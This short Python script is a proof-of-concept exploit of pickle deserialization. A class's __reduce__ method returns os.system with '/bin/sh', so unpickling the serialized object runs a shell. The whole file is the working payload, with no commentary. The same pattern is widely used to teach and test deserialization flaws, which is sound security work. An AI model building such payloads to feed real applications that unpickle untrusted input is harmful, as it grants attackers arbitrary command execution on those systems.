import pickle
import os

class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))

data = pickle.dumps(RunBinSh())
pickle.loads(data)
